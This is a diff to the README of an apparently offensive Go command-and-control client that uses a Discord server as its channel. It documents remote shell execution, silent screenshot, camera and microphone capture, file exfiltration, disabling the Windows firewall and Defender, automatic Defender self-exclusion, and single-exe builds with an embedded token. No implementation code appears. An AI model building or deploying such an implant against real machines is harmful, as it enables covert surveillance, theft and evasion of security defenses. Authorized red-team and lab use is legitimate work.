@@ -43,7 +43,7 @@ From that device channel you can:
 
 **Technical scope**
 
-- Language: Go 1.19+
+- Language: Go 1.21+
 - Protocol: Discord HTTP + WebSocket via [github.com/bwmarrin/discordgo](https://github.com/bwmarrin/discordgo)
 - Platforms:
   - Windows: full feature set (filesystem, commands, media, Windows security).
@@ -56,193 +56,78 @@ From that device channel you can:
 
 ## 2. Project Structure Map
 
+Detailed guides: [Configuration](docs/CONFIGURATION.md), [Control reference](docs/CONTROL.md), [Two-container lab](docs/LAB.md), [Security](docs/SECURITY.md), [Skills used](docs/SKILLS.md), [Architecture](docs/ARCHITECTURE.md).
+
 Repository root:
 
 ```text
-discord-c2-server/
-├── actions/
-│   ├── media.go
-│   ├── ffmpeg_embed_windows.go
-│   └── ffmpeg_embed_stub.go
-├── categories.go
-├── client.go
-├── env.go
-├── handler.go
-├── interactions.go
-├── interactions_cmd.go
-├── interactions_control.go
-├── interactions_fs.go
-├── interactions_help.go
-├── interactions_help_test.go
-├── interactions_log.go
-├── interactions_media.go
-├── interactions_system.go
-├── interactions_windows.go
+discord-c2/
+├── main.go                     # entrypoint: load config, start bot
+├── env_embed.go                # //go:embed .env (build tag: envembed)
+├── env_embed_stub.go           # no-op stub for default builds
 ├── go.mod
 ├── go.sum
+├── internal/
+│   ├── bot/
+│   │   ├── bot.go              # session startup, registration, banner
+│   │   ├── category.go         # OS category + per-device channel helpers
+│   │   ├── handler.go          # message/emoji shortcuts, quick help
+│   │   └── process.go          # restart wrapper
+│   ├── commands/
+│   │   ├── router.go           # interaction router (slash, buttons, modals)
+│   │   ├── definitions.go      # slash-command definitions (data only)
+│   │   ├── help.go             # /help
+│   │   ├── cmd.go              # /cmd
+│   │   ├── fs.go               # /fs cwd /fs ls /fs download /fs upload
+│   │   ├── log.go              # /sys log
+│   │   ├── media.go            # /media screenshot /media camera /media mic /media record /media recordstop
+│   │   ├── system.go           # /sys ps /sys pidinfo
+│   │   ├── windows.go          # /win sec /win firewall /win defender /win exclude
+│   │   ├── control.go          # /dev restart
+│   │   └── help_test.go        # unit test for the help responder
+│   ├── config/config.go        # .env loading + Config type
+│   ├── logstream/logstream.go  # io.Writer that mirrors logs into Discord
+│   ├── media/
+│   │   ├── media.go            # capture/recording + ffmpeg discovery
+│   │   ├── ffmpeg_embed_windows.go
+│   │   └── ffmpeg_embed_stub.go
+│   ├── process/process.go      # self re-exec (restart)
+│   ├── shell/shell.go          # command execution + output chunking
+│   └── winsec/winsec.go        # firewall/Defender status and controls
+├── docs/
+│   └── ARCHITECTURE.md         # package boundaries and data flow
 ├── .gitignore
 └── README.md
 ```
 
-**Directory and file descriptions**
+### 2.1 Package responsibilities
 
-- `actions/`
-  - `media.go`  
-    Implements all media‑related actions:
-    - `Screenshot`: captures all displays and uploads PNG images.
-    - `CameraSnapshot`: Windows camera still image via ffmpeg/DirectShow.
-    - `MicRecord`: Windows microphone recording to audio file (size‑checked).
-    - `VideoRecord` / `VideoStop`: segmented video recording using ffmpeg, with bitrate‑based segmentation algorithm (see below).
-    - ffmpeg availability logic:
-      - Finds ffmpeg in `PATH`.
-      - Falls back to bundled `ffmpeg` folder.
-      - On Linux, can install ffmpeg via `apt-get`, `dnf`, `yum`, `zypper`, or `pacman`.
-  - `ffmpeg_embed_windows.go`  
-    Windows‑only, when built with `-tags ffmpegembed`. Uses `//go:embed` to bake `ffmpeg/windows/ffmpeg.exe` into the binary as `embeddedFFmpegWin`.
-  - `ffmpeg_embed_stub.go`  
-    Stub for non‑embed builds or non‑Windows OS. Defines an empty `embeddedFFmpegWin` so the code compiles everywhere.
+- `main` — parses configuration and calls `bot.Run`. No Discord logic.
+- `internal/config` — applies `key=value` pairs from an optional embedded
+  payload and `.env`, then validates `DISCORD_BOT_TOKEN` and `DISCORD_GUILD_ID`.
+- `internal/bot` — owns the Discord session, command registration, channel
+  provisioning, the connection banner, and the message shortcut handler.
+- `internal/commands` — one file per command family plus a router. Handlers only
+  format Discord responses and delegate work to leaf packages.
+- `internal/shell` — runs `cmd.exe /c` or `/bin/bash -c` and chunks output into
+  Discord-sized messages.
+- `internal/logstream` — `io.Writer` wrapper used as `log.SetOutput`.
+- `internal/media` — screenshots, camera, microphone, segmented video, and
+  ffmpeg discovery (PATH → bundled → embedded → package-manager install).
+- `internal/winsec` — Windows firewall/Defender helpers; safe on all platforms
+  (returns `unsupported`).
+- `internal/process` — re-execs the binary for `/dev restart` and `🔁`.
 
-- `client.go`  
-  Main entrypoint:
-  - Loads configuration via `loadEnvFile(".env")`.
-  - Creates Discord session and registers:
-    - Slash commands (`/cmd`, `/screenshot`, `/camera`, `/mic`, `/record`, `/recordstop`, `/log`, `/cwd`, `/ls`, `/ps`, `/pidinfo`, `/winsec`, `/winfirewall`, `/windefender`, `/windefenderexclude`, `/download`, `/upload`, `/restart`).
-  - Detects OS, user, hostname, IP.
-  - Creates/ensures OS category and device channel using helpers in `categories.go`.
-  - Posts the initial banner and pins it.
-  - Sets `log.SetOutput` to a custom writer that can stream logs into Discord.
-  - Automatically:
-    - Ensures the current executable is excluded from Defender (Windows).
-    - Enables log streaming to the device channel.
-    - Checks ffmpeg availability and logs the result.
+### 2.2 Dependency direction
 
-- `env.go`  
-  Configuration and environment embedding:
-  - Uses `//go:embed .env` to optionally embed `.env` at build time.
-  - `loadEnvFile`:
-    - Reads from embedded `.env` if present.
-    - Otherwise parses `.env` from disk.
-  - Sets process‑wide env vars such as:
-    - `DISCORD_BOT_TOKEN`
-    - `DISCORD_GUILD_ID`
+```text
+main → bot → commands → { shell, media, winsec, logstream, process }
+                 └──────→ config (startup only)
+```
 
-- `categories.go`  
-  Discord channel / category helpers:
-  - `getOrCreateCategory`: creates `windows`, `linux`, `mac`, or `other`.
-  - `getOrCreateDeviceChannel`: creates or reuses a channel per device.
-  - `makeChannelName`: normalizes `hostname-username` into a valid channel name.
-
-- `handler.go`  
-  Core Discord message handler and log streaming:
-  - `discordLogWriter`:
-    - Wraps an underlying writer (stdout) and optionally forwards log lines to a device channel as ```log``` blocks.
-  - `enableLogStreaming` / `disableLogStreaming`:
-    - Toggle streaming of Go logs into a specific channel.
-  - `handler`:
-    - Processes messages in the device channel.
-    - Supports emoji shortcuts:
-      - `📸` – screenshots.
-      - `📷` – camera snapshot.
-      - `🎙` – 10‑second microphone recording.
-      - `👇 <path>` – download file (8 MB limit).
-      - `☝️ <path>` + attachment – upload file.
-      - `🔁` – restart client.
-      - `💀` – terminate client.
-
-- `interactions.go`  
-  Slash command dispatcher:
-  - Routes each slash command to the corresponding `handleSlash*` function in the specialized files below.
-
-- `interactions_cmd.go`  
-  - `/cmd <command>` – run arbitrary shell command:
-    - Windows: `cmd.exe /c`.
-    - Linux/macOS: `/bin/bash -c`.
-
-- `interactions_fs.go`  
-  Filesystem commands:
-  - `/cwd` – show current working directory (`cd` on Windows, `pwd` elsewhere).
-  - `/ls [path]` – list directory (`dir` on Windows, `ls` elsewhere).
-  - `/download <source> [destination]` – download file (≤ 8 MB) as attachment.
-  - `/upload <source attachment> <destination>` – write Discord attachment to a path on the client, resolving `~/` and directories.
-
-- `interactions_media.go`  
-  Media commands:
-  - `/screenshot` – capture all active displays and upload PNGs.
-  - `/camera` – Windows camera snapshot (DirectShow via ffmpeg).
-  - `/mic [duration] [path]`:
-    - Default duration: 10 seconds.
-    - Range: 1–300 seconds enforced.
-    - Optional `path` (supports `~/` expansion); if omitted, uses temp directory.
-  - `/record <source> [max_size_mb] [duration_minutes] [max_parts] [quality]`:
-    - `source`: `camera` or `screen` (Windows only).
-    - `max_size_mb`: default 2, clamped 1–8 MB per file.
-    - `duration_minutes`: optional total duration.
-    - `max_parts`: optional; if omitted, computed based on bitrate estimate.
-    - `quality`: `low`, `medium` (default), or `high`.
-    - Uses a simple bitrate‑based segmentation algorithm:
-      - Estimate total bytes as `duration * bitrate`.
-      - Divide by `max_size_mb` to derive `max_parts` (capped at 30).
-      - Enforces minimum 5 seconds per segment.
-  - `/recordstop` – stop current video recording (if any).
-
-- `interactions_system.go`  
-  System information:
-  - `/ps` – list processes:
-    - `tasklist` on Windows.
-    - `ps aux` on Unix‑like systems.
-  - `/pidinfo <pid>` – show details for a specific process:
-    - Uses `tasklist /FI "PID eq <pid>"` on Windows.
-    - Uses `ps -p <pid> ...` on Unix‑like systems.
-
-- `interactions_windows.go`  
-  Windows‑specific security controls:
-  - `/winsec`:
-    - Reports firewall state (enabled/disabled/mixed/unknown) via `netsh advfirewall`.
-    - Reports Defender real‑time protection via `Get-MpComputerStatus`.
-  - `/winfirewall <mode>`:
-    - `mode`: `on` or `off`.
-    - Uses `netsh advfirewall set allprofiles state <mode>`.
-    - Logs results and returns `netsh` output (trimmed) to the operator.
-  - `/windefender <mode>`:
-    - `mode`: `on` or `off`.
-    - Uses PowerShell `Set-MpPreference -DisableRealtimeMonitoring`.
-  - `/windefenderexclude [path]`:
-    - Adds Defender exclusion for a path.
-    - If `path` omitted, uses the current executable.
-    - Internally uses `Get-MpPreference` and `Add-MpPreference`.
-  - Startup behavior:
-    - `ensureCurrentExeDefenderExcluded`:
-      - Checks if the current executable is already excluded.
-      - Adds exclusion if needed and logs the outcome.
-
-- `interactions_help.go` / `interactions_help_test.go`  
-  - `/help` – sends an ephemeral help message summarizing:
-    - Slash commands.
-    - Emoji shortcuts.
-    - Quick‑action buttons (`whoami`, `id`, `hostname`, `ip info`, `cwd`).
-  - Test file exercises the help handler in isolation.
-
-- `interactions_log.go`  
-  - `/log <mode>`:
-    - `mode`: `on` or `off`.
-    - Enables/disables streaming of Go logs into the current channel.
-
-- `interactions_control.go`  
-  - `/restart` – restart the client process using platform‑specific re‑exec logic.
-
-- `interactions.go`  
-  - Central interaction handler that:
-    - Inspects `InteractionCreate` payloads.
-    - Dispatches to the correct `handleSlash*` function.
-
-- `go.mod`, `go.sum`  
-  - Go module definition and dependency lockfile.
-
-- `.gitignore`  
-  - Standard Git ignore rules (build artifacts, local environment files, etc.).
-
-- `README.md`  
-  - This documentation.
+Leaf packages never import `bot` or `commands`, so the graph stays acyclic.
+`winsec` and `media` compile on every platform; platform behavior is selected at
+runtime through `runtime.GOOS`.
 
 ---
 
@@ -252,11 +137,11 @@ discord-c2-server/
 
 - Windows 10/11 (x64) – full capabilities.
 - Linux (modern distributions; x64) – non‑media features fully supported; media features depend on ffmpeg and display/audio stack.
-- macOS (x64/ARM64) – basic command/filesystem/process features; media features are currently Windows‑focused.
+- macOS (x64/ARM64) – builds as of the 2025-06 `screenshot` dependency; basic command/filesystem/process features. Media features remain Windows‑focused.
 
 ### 3.2 Software prerequisites
 
-- **Go**: 1.19 or newer (for building from source).
+- **Go**: 1.21 or newer (for building from source).
 - **Discord**:
   - A Discord account.
   - A Discord application with a bot user and token.
@@ -290,12 +175,14 @@ Create a `.env` file in the repository root:
 ```env
 DISCORD_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
 DISCORD_GUILD_ID=YOUR_GUILD_ID_HERE
+DISCORD_ALLOWED_USERS=
 ```
 
 - `DISCORD_BOT_TOKEN` – Bot token from the Discord Developer Portal (without the `Bot ` prefix).
 - `DISCORD_GUILD_ID` – Numeric ID of the Discord server to manage.
+- `DISCORD_ALLOWED_USERS` – Optional comma-separated user IDs allowed to control devices. Empty means any guild member in the device channel.
 
-The file is **optionally embedded** into the binary at build time via `//go:embed .env`. If embedded, you do not need to ship `.env` separately unless you want to override values via environment variables.
+The file is **optionally embedded** into the binary at build time with `-tags envembed` (see `env_embed.go`). Default builds read `.env` from the working directory at startup; existing environment variables take precedence over embedded values.
 
 > Never commit real tokens to a public repository. Rotate tokens immediately if they leak.
 
@@ -362,20 +249,25 @@ The resulting `dc2-client.exe` is smaller and contains less debug metadata but b
 
 ### 4.3 Embedding `.env` and ffmpeg (Windows)
 
-To build a **single exe** containing both configuration and ffmpeg:
+Default builds read `.env` at runtime. To build a **single exe** containing both
+configuration and ffmpeg:
 
-1. Ensure `.env` exists in the repo root. It is automatically embedded by `env.go`.
+1. Ensure `.env` exists in the repo root. It is embedded only when the
+   `envembed` build tag is set (see `env_embed.go`).
 2. Place `ffmpeg.exe` for embedding at:
 
    ```text
-   actions/ffmpeg/windows/ffmpeg.exe
+   internal/media/ffmpeg/windows/ffmpeg.exe
    ```
 
-3. Build with the `ffmpegembed` tag:
+3. Build with the `envembed` and `ffmpegembed` tags:
 
    ```powershell
-   go build -tags ffmpegembed -ldflags "-s -w" -o dc2-client.exe .
+   go build -tags "envembed ffmpegembed" -ldflags "-s -w" -o dc2-client.exe .
    ```
+
+Without `envembed`, a missing `.env` is not a build failure; the client simply
+requires the variables to be present in the process environment.
 
 This produces a single `dc2-client.exe` that:
 
@@ -412,6 +304,18 @@ Linux:
 
 On startup, a device channel is created/updated and a “New device connected” banner is posted and pinned.
 
+### 4.6 Two-container lab (Docker)
+
+Run one Debian container as the target and one as the attacker:
+
+```bash
+GO=$(command -v go) ./lab/run.sh
+```
+
+The attacker posts commands to the device channel through a webhook, so no
+second bot token is required. Full prerequisites, expected output, manual
+control, and troubleshooting are in [`docs/LAB.md`](docs/LAB.md).
+
 ---
 
 ## 5. Usage Guidelines
@@ -441,12 +345,12 @@ Example:
 /cmd command="ipconfig /all"
 ```
 
-#### `/screenshot`
+#### `/media screenshot`
 
 - Captures all active displays using the screenshot library.
 - Uploads one PNG per display to the device channel.
 
-#### `/camera`
+#### `/media camera`
 
 - Windows only.
 - Captures a single frame from the default camera using ffmpeg/DirectShow:
@@ -454,7 +358,7 @@ Example:
   - Otherwise auto‑detects a DirectShow video device.
 - Uploads a JPEG snapshot to the channel.
 
-#### `/mic [duration] [path]`
+#### `/media mic [duration] [path]`
 
 - Records audio from the microphone.
 - Parameters:
@@ -471,10 +375,10 @@ Example:
 Example:
 
 ```text
-/mic duration=60 path="~/recordings/meeting.m4a"
+/media mic duration=60 path="~/recordings/meeting.m4a"
 ```
 
-#### `/record <source> [max_size_mb] [duration_minutes] [max_parts] [quality]`
+#### `/media record <source> [max_size_mb] [duration_minutes] [max_parts] [quality]`
 
 Segmented video recording (Windows):
 
@@ -512,14 +416,14 @@ Internally, the client:
 - Loops segment creation until:
   - `max_parts` reached, or
   - Requested duration covered, or
-  - Recording is stopped via `/recordstop`.
+  - Recording is stopped via `/media recordstop`.
 
-#### `/recordstop`
+#### `/media recordstop`
 
 - Signals the recording goroutine to stop current recording.
 - Gracefully terminates ffmpeg and finalizes the last segment.
 
-#### `/log <mode>`
+#### `/sys log <mode>`
 
 - `mode`: `on` or `off`.
 - When `on`:
@@ -529,31 +433,31 @@ Internally, the client:
 
 Note: on startup, the client automatically enables log streaming for the device channel and logs ffmpeg and Windows security checks.
 
-#### `/cwd`
+#### `/fs cwd`
 
 - Shows current working directory for the client:
-  - Runs `cd` on Windows, `pwd` elsewhere, via `runCommandString`.
+  - Runs `cd` on Windows, `pwd` elsewhere, via `internal/shell`.
 
-#### `/ls [path]`
+#### `/fs ls [path]`
 
 - Lists directory contents:
   - `ls` on Unix.
   - `dir` on Windows.
 - `path` optional; defaults to current directory.
 
-#### `/ps`
+#### `/sys ps`
 
 - Lists running processes:
   - `tasklist` on Windows.
   - `ps aux` on Unix‑like systems.
 
-#### `/pidinfo <pid>`
+#### `/sys pidinfo <pid>`
 
 - Displays details for a specific process:
   - Windows: `tasklist /FI "PID eq <pid>"`.
   - Unix‑like: `ps -p <pid> -o ...`.
 
-#### `/download <source> [destination]`
+#### `/fs download <source> [destination]`
 
 - Streams a small local file back as an attachment.
 - Enforces 8 MB limit.
@@ -563,14 +467,14 @@ Note: on startup, the client automatically enables log streaming for the device 
 - `destination`:
   - Optional label for your own tracking; does not affect path on disk.
 
-#### `/upload <source attachment> <destination>`
+#### `/fs upload <source attachment> <destination>`
 
 - Downloads a Discord attachment and writes it to the device.
 - `destination`:
   - May be a directory; the attachment filename is appended.
   - Supports `~/` expansion.
 
-#### `/restart`
+#### `/dev restart`
 
 - Triggers a local restart of the client process:
   - Windows: spawns a new process with same args and exits.
@@ -578,26 +482,26 @@ Note: on startup, the client automatically enables log streaming for the device 
 
 #### Windows security commands
 
-##### `/winsec`
+##### `/win sec`
 
 - Shows:
   - Firewall state (enabled/disabled/mixed/unknown).
   - Defender real‑time protection state.
 
-##### `/winfirewall <mode>`
+##### `/win firewall <mode>`
 
 - `mode`: `on` or `off`.
 - Applies to all profiles via `netsh advfirewall set allprofiles state <mode>`.
 - Returns reported status and truncated `netsh` output.
 - Recommended to run the client with sufficient privileges.
 
-##### `/windefender <mode>`
+##### `/win defender <mode>`
 
 - `mode`: `on` or `off`.
 - Uses PowerShell `Set-MpPreference -DisableRealtimeMonitoring`.
 - Reports the final Defender status via `Get-MpComputerStatus`.
 
-##### `/windefenderexclude [path]`
+##### `/win exclude [path]`
 
 - Adds a Defender exclusion:
   - `path` optional; if omitted, uses current executable path.
@@ -610,12 +514,12 @@ Note: on startup, the client automatically enables log streaming for the device 
 
 Available in the device channel:
 
-- `📸` – `/screenshot`
-- `📷` – `/camera` (Windows)
-- `🎙` – `/mic` (10 seconds default)
-- `👇 <path>` – `/download`
-- `☝️ <path>` + attachment – `/upload`
-- `🔁` – `/restart`
+- `📸` – `/media screenshot`
+- `📷` – `/media camera` (Windows)
+- `🎙` – `/media mic` (10 seconds default)
+- `👇 <path>` – `/fs download`
+- `☝️ <path>` + attachment – `/fs upload`
+- `🔁` – `/dev restart`
 - `💀` – terminate the client process
 
 ---
@@ -684,9 +588,12 @@ No other human authors are claimed; third‑party libraries maintain their own l
   - Keep functions small and focused.
   - Prefer explicit error handling and logging.
 - Architecture:
-  - Keep Discord interaction routing in `interactions*.go`.
-  - Keep platform‑specific logic isolated (e.g., `interactions_windows.go`).
-  - Keep media‑specific logic in `actions/media.go`.
+  - Keep Discord interaction routing in `internal/commands/router.go`.
+  - Add one file per command family under `internal/commands/` and register it
+    in `handleSlashCommand`.
+  - Keep platform‑specific logic isolated (for example `internal/winsec`).
+  - Keep media logic in `internal/media/media.go`.
+  - Leaf packages must not import `internal/bot` or `internal/commands`.
 
 ### 7.2 Branching and pull requests
 
@@ -739,7 +646,7 @@ When opening an issue, include:
   - `DISCORD_BOT_TOKEN` and `DISCORD_GUILD_ID` in `.env` are correct.
   - The bot is invited to the guild.
   - Bot has `Manage Channels` permission.
-- Check logs (via `/log on` or console) for:
+- Check logs (via `/sys log on` or console) for:
   - `failed to create Discord session`
   - `failed to ensure category`
   - `failed to ensure device channel`
@@ -756,7 +663,7 @@ When opening an issue, include:
 
 Symptoms:
 
-- `/mic`, `/camera`, `/record` fail with “ffmpeg unavailable” or detailed ffmpeg error output.
+- `/media mic`, `/media camera`, `/media record` fail with “ffmpeg unavailable” or detailed ffmpeg error output.
 
 Checks:
 
@@ -769,12 +676,12 @@ Checks:
 - Or confirm bundled/embedded binary:
   - `ffmpeg/windows/ffmpeg.exe` (bundled).
   - `ffmpeg/linux/ffmpeg` (Linux).
-  - Or build with `-tags ffmpegembed` and ensure `actions/ffmpeg/windows/ffmpeg.exe` is present at build time.
+  - Or build with `-tags ffmpegembed` and ensure `internal/media/ffmpeg/windows/ffmpeg.exe` is present at build time.
 
 ### 8.4 Windows firewall/Defender commands fail
 
 - Ensure the client is running with administrative privileges.
-- Check error messages returned by `/winfirewall` or `/windefender`:
+- Check error messages returned by `/win firewall` or `/win defender`:
   - They include truncated `netsh` or PowerShell error text.
 - Verify:
   - PowerShell is available (`powershell` in `PATH`).
@@ -782,8 +689,8 @@ Checks:
 
 ### 8.5 Log streaming not visible
 
-- `/log on` enables log streaming for the channel.
-- On startup, the client already enables logging for its device channel; if you moved the client between channels or guilds, rerun `/log on`.
+- `/sys log on` enables log streaming for the channel.
+- On startup, the client already enables logging for its device channel; if you moved the client between channels or guilds, rerun `/sys log on`.
 
 ---
 
@@ -796,12 +703,12 @@ A: No. This is a single client designed to connect to Discord as its transport. 
 A: No. Use is restricted to environments where you have explicit authorization. See the legal section.
 
 **Q: Can I add new actions (features)?**  
-A: Yes. Add new slash command definitions in `client.go`, route them in `interactions.go`, and implement handlers in a dedicated `interactions_*.go` or `actions/*.go` file.
+A: Yes. Add the definition in `internal/commands/definitions.go`, route it in `handleSlashCommand` in `internal/commands/router.go`, and implement the handler in a new file under `internal/commands/`.
 
 **Q: Does this support multiple operators?**  
-A: Yes. Any Discord user with access to the device channel can use the slash commands and emoji shortcuts.
+A: Yes. Any Discord user with access to the device channel can use the slash commands and emoji shortcuts, unless `DISCORD_ALLOWED_USERS` is set, in which case only those user IDs are accepted.
 
-**Q: How big can uploads/downloads be?**  
+**Q: How big can uploads/fs downloads be?**  
 A: The code enforces an 8 MB limit for files sent to Discord to comply with standard Discord file limits.
 
 ---
@@ -810,13 +717,28 @@ A: The code enforces an 8 MB limit for files sent to Discord to comply with stan
 
 Recent notable changes:
 
-- Refactored core logic into modular `interactions_*.go` and `actions/media.go`.
+- Security audit: upgraded `gorilla/websocket` (GO-2026-6278), `discordgo`, and
+  `screenshot`; added `DISCORD_ALLOWED_USERS`; attachment HTTP timeout; ffmpeg
+  temp permissions tightened. `govulncheck` and `staticcheck` are clean.
+- Added a two-container Docker lab (`lab/`, `deploy/`) and `docs/LAB.md`,
+  `docs/CONFIGURATION.md`, `docs/CONTROL.md`, `docs/SECURITY.md`.
+
+- Restructured into `main` + `internal/*` packages (`bot`, `commands`, `config`,
+  `logstream`, `media`, `process`, `shell`, `winsec`); command definitions moved
+  to `internal/commands/definitions.go`.
+- Made `.env` embedding opt-in via `-tags envembed`, so default builds no longer
+  fail when `.env` is absent.
+- Renamed `interactions_windows.go` to a platform-neutral file so non-Windows
+  builds compile.
+- Added tests for config loading, command definitions, and Windows security
+  helpers, plus a `Makefile` and `docs/ARCHITECTURE.md`.
+- Refactored core logic into modular command files under `internal/commands/` and `internal/media/media.go`.
 - Added comprehensive slash commands for:
   - Media (screenshot, camera, mic, record, recordstop).
   - Filesystem (cwd, ls, download, upload).
   - Processes (ps, pidinfo).
-  - Windows security (winsec, winfirewall, windefender, windefenderexclude).
-  - Logging (/log) and restart (/restart).
+  - Windows security (`/win sec`, `/win firewall`, `/win defender`, `/win exclude`).
+  - Logging (/sys log) and restart (/dev restart).
 - Implemented ffmpeg bundling and optional embedding (`ffmpegembed` build tag).
 - Added automatic Defender exclusion for the current executable.
 - Enhanced initial device banner with firewall/Defender status (Windows).
